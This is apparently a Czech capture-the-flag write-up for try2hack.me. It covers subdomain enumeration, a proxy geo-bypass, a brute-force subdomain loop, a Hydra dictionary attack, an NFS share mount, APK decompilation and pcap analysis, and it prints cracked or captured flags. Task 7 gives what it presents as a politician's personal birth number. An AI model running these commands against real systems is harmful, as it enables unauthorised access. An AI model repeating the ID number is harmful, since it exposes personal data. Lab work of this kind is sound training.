
**[Try 2 Hack Me](https://try2hack.me)**

---
---

## Úkol č. 1

### Zadání:

Na našem serveru, na kterém se momentálně nacházíš, existuje několik skrytých subdomén. Podaří se ti odhalit tu, která sestává z více jak 10 písmen, aniž bys použil útok hrubou silou? Heslo pro úspěšné splnění tohoto kola se nachází na objevené subdoméně. Pokud se ti místo hesla zobrazuje homepage, pak nejde o správné řešení.

---

### Postup řešení

```console
root@kali:~/Projects/CTF_tools# git clone https://github.com/aboul3la/Sublist3r.git
Cloning into 'Sublist3r'...
remote: Enumerating objects: 346, done.
remote: Total 346 (delta 0), reused 0 (delta 0), pack-reused 346
Receiving objects: 100% (346/346), 1.09 MiB | 2.02 MiB/s, done.
Resolving deltas: 100% (197/197), done.
root@kali:~/Projects/CTF_tools# cd Sublist3r/
root@kali:~/Projects/CTF_tools/Sublist3r# python sublist3r.py -d try2hack.me

                 ____        _     _ _     _   _____
                / ___| _   _| |__ | (_)___| |_|___ / _ __
                \___ \| | | | '_ \| | / __| __| |_ \| '__|
                 ___) | |_| | |_) | | \__ \ |_ ___) | |
                |____/ \__,_|_.__/|_|_|___/\__|____/|_|

                # Coded By Ahmed Aboul-Ela - @aboul3la

[-] Enumerating subdomains now for try2hack.me
[-] Searching now in Baidu..
[-] Searching now in Yahoo..
[-] Searching now in Google..
[-] Searching now in Bing..
[-] Searching now in Ask..
[-] Searching now in Netcraft..
[-] Searching now in DNSdumpster..
[-] Searching now in Virustotal..
[-] Searching now in ThreatCrowd..
[-] Searching now in SSL Certificates..
[-] Searching now in PassiveDNS..
[-] Total Unique Subdomains Found: 2
www.try2hack.me
secretsubdom.try2hack.me
```

---

### Flag:

```
secretsubdom
```

---
---

## Úkol č. 2

### Zadání:

Při jednom ze tvých úspěšných útoků se ti podařilo odcizit hash hesla uživatele root, přičemž tajné heslo pro úspěšné dokončení tohoto kola se s tímto heslem shoduje. Podaří se ti ho prolomit?

```
$6$VQoztKJH$0aL8rygMd8gfX7m8cTRWOn4pqQ6bA/jkPyQSnzU0g10E0UiMQjIijs/66vflY7cMrGSKmmiBWE7r8oNCDQc3D/
```

---

### Postup řešení

---

### Flag:

```
temp
```

---
---

## Úkol č. 3

### Zadání:

Na [této](https://try2hack.me/AdminPanel.php) adrese se nachází administrace, která je dostupná pouze z Jižní Afriky. Podaří se ti obejít bezpečnostní mechanismus stránky tak, abys získal tajné heslo?

---

### Postup řešení

```bash
# https://www.proxynova.com/proxy-server-list/country-za/

curl -x 41.135.120.70:8080 -L https://try2hack.me/AdminPanel.php
```

---

### Flag:

```
Wi3ft0Wpizh8cV
```

---
---

## Úkol č. 4

### Zadání:

Zjisti skutečnou IP adresu serveru, na kterém je provozována skrytá služba v síti Tor s adresou ixbttupkdzeamjjkjyeqwkdmoawirpvxvzez3t5htq2nia24bink53ad.onion.

---

### Postup řešení

---

### Flag:

```
temp
```

---
---

## Úkol č. 5

### Zadání:

U hackované společnosti jsi vytvořil Rogue AP a zachytil níže uvedenou komunikaci. Tajné heslo se shoduje s heslem uživatele **novakp**.

```
mschapv2: Wed Apr 10 19:51:13 2019
     domain\username:     novakp
     username:            novakp
     challenge:           94:0f:90:ec:96:ce:32:ec
     response:            f0:8f:68:d2:29:94:da:62:be:c3:6e:26:b0:b1:1d:81:d9:01:24:73:5d:dd:ba:60
```

---

### Postup řešení

---

### Flag:

```
temp
```

---
---

## Úkol č. 6

### Zadání:

Na našem serveru, na kterém se momentálně nacházíš, existuje několik skrytých subdomén. Podaří se ti odhalit tu, která sestává přesně ze 3 alfanumerických znaků? Při řešení úkolu lze využít útok hrubou silou, nikoliv však na formulář s heslem. Heslo pro úspěšné splnění tohoto kola se nachází na odhalené subdoméně.

---

### Postup řešení

```bash
function find-subdomain() {
	for c1 in {a..z} {0..9}; do
		for c2 in {a..z} {0..9}; do
			{
				for c3 in {a..z} {0..9}; do
					curl http://${c1}${c2}${c3}.try2hack.me 2>/dev/null | grep -i password
				done
			} | grep -i password && return 0
			wait
		done
	done
} 2>/dev/null
```

---

### Flag:

```
Bir63Fpw0d9MX
```

---
---

## Úkol č. 7

### Zadání:

Tajné heslo se shoduje s rodným číslem prezidenta České republiky Miloše Zemana. Podaří se ti je pomocí internetu zjistit, aniž bys použil metodu hrubé síly?

---

### Postup řešení

[neviditelna.rozhlas.cz](https://neviditelna.rozhlas.cz/socialni-site-digitalni-stopa-zustava-i-kdyz-sva-data-chranite-6821509)

---

### Flag:

```
440928/086
```

---
---

## Úkol č. 8

### Zadání:

Pro přihlášení do interního systému napadené společnosti je použita utilita [login](/08/login.zip) zkompilovaná pro platformu Windows. Heslo pro přihlášení skrz tuto jednoúčelovou aplikaci je shodné s hledaným tajným heslem.

---

### Postup řešení

---

### Flag:

```
temp
```

---
---

## Úkol č. 9

### Zadání:

Tajné heslo pro splnění tohoto úkolu je stejné, jako anglicky psané město, ve kterém žije člověk jménem Jason Macrapatulos. Podaří se ti místo pobytu tohoto člověka vypátrat a splnit tak další z řady úkolů?

---

### Postup řešení

---

### Flag:

```
temp
```

---
---

## Úkol č. 10

### Zadání:

Dokázal jsi proniknout do sítě významné společnosti, kde jsi zapnul sniffer a zachytil část [síťového provozu](/10/netdump.zip). Podaří se ti její analýzou získat tajné heslo, které se v daný moment přes síť přenášelo?

---

### Postup řešení

```bash
tshark -O SIP -nr ./netdump.pcap -qx | grep -A 2 -B 1 s.w.o.r.d | tr -d '.' | sed 's/.*   //' | tr -d '\n'
```

---

### Flag:

```
mNhr6sW9cs0sD4sVoVpwjf6C
```

---
---

## Úkol č. 11

### Zadání:

Tajné heslo pro splnění tohoto úkolu je schované v heslem chráněné [administraci](https://try2hack.me/manage/). Podaří se ti do ní dostat pomocí slovníkového útoku?

---

### Postup řešení

```bash
hydra -s 443 -S -V -l admin -P ./rockyou.txt -e s -t 30 -m /manage/ try2hack.me https-get
# [443][http-get] host: try2hack.me   login: admin   password: falcon
curl https://admin:falcon@try2hack.me/manage/
```

---

### Flag:

```
Veinsg5Vskg2Fpcb
```

---
---

## Úkol č. 12

### Zadání:

Zachytil jsi tajnou zprávu teroristické organizace. Podaří se ti ji rozluštit, pokud víš, že se jedná o Vernamovu šifru využívající operaci XOR nad klíčem, který je součástí textu Lorem Ipsum a odesilatel se v každé zprávě podepisuje jako Ahmed?

```
26041 f0f0a 54170 04f06 01011 b4f55 181d1 6001d 14005 d5722
13115 20000 00290 d1b0b 11401 91c29 49024 25433 010e0 017
```

```
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nam pharetra euismod ex, et dignissim risus sollicitudin id. Fusce ac mi sed massa dictum rutrum eu a eros. Orci varius natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Mauris malesuada ultrices velit, non auctor justo varius in. Nullam eget consectetur odio. Sed euismod posuere enim, eu aliquet purus facilisis et. In hac habitasse platea dictumst. Proin elementum interdum lorem, eget egestas velit tincidunt vel. In imperdiet, eros congue porttitor malesuada, mi mi dignissim tellus, ut luctus magna neque nec turpis. Nam sed nulla quis elit tempor blandit placerat id enim. Morbi malesuada nibh sem, eu feugiat nibh rutrum ac. Mauris facilisis lorem ut lobortis maximus.
```

---

### Postup řešení

---

### Flag:

```
temp
```

---
---

## Úkol č. 13

### Zadání:

Získal jsi přístup k telefonu oběti, přičemž tvým cílem je průnik do v něm nainstalované, ovšem heslem chráněné aplikace [findmypass.apk](/13/findmypass.apk). Heslo pro přístup do uvedené aplikace se shoduje s tajným heslem tohoto kola.

---

### Postup řešení

```bash
docker run -v $(pwd):/apk duolabs/apk2java /apk/findmypass.apk
grep -A5 -R -i pass ./findmypass.apk.src/ | grep -i '"'
```

---

### Flag:

```
Secure1369Pass
```

---
---

## Úkol č. 14

### Zadání:

Správce serveru, na kterém se právě nacházíš, používá ke sdílení dat síťové úložiště. Podaří se ti je objevit a získat tak heslo pro splnění tohoto úkolu?

---

### Postup řešení

```bash
sudo mount -t nfs try2hack.me:$(showmount -e try2hack.me | tail -n 1 | awk '{ print $1 }') ./tmp/
cat ./tmp/Password.txt
sudo umount ./tmp
```

---

### Flag:

```
Ciw27xDowP20eXnv
```

---
---

## Úkol č. 15

### Zadání:

Cílový server používá pro monetizaci obsahu vlastní reklamní systém založený na bannerové reklamě. Podaří se ti v něm odhalit chybu a získat tak tajné heslo pro splnění tohoto úkolu?

---

### Postup řešení

---

### Flag:

```
temp
```

